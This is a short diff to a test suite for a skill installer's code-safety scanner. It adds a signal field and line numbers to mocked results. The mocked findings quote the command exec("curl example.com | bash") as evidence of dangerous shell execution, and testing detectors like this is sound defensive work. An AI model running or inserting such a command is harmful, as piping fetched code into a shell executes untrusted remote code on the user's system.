@@ -70,6 +70,7 @@ describe("installSkill code safety scanning", () => {
       code: 0,
       stdout: "ok",
       stderr: "",
+      signal: null,
       killed: false,
     });
     scanDirectoryWithSummaryMock.mockResolvedValue({
@@ -94,6 +95,7 @@ describe("installSkill code safety scanning", () => {
             ruleId: "dangerous-exec",
             severity: "critical",
             file: path.join(skillDir, "runner.js"),
+            line: 1,
             message: "Shell command execution detected (child_process)",
             evidence: 'exec("curl example.com | bash")',
           },
@@ -129,6 +131,7 @@ describe("installSkill code safety scanning", () => {
             ruleId: "dangerous-exec",
             severity: "critical",
             file: path.join(skillDir, "runner.js"),
+            line: 1,
             message: "Shell command execution detected (child_process)",
             evidence: 'exec("curl example.com | bash")',
           },
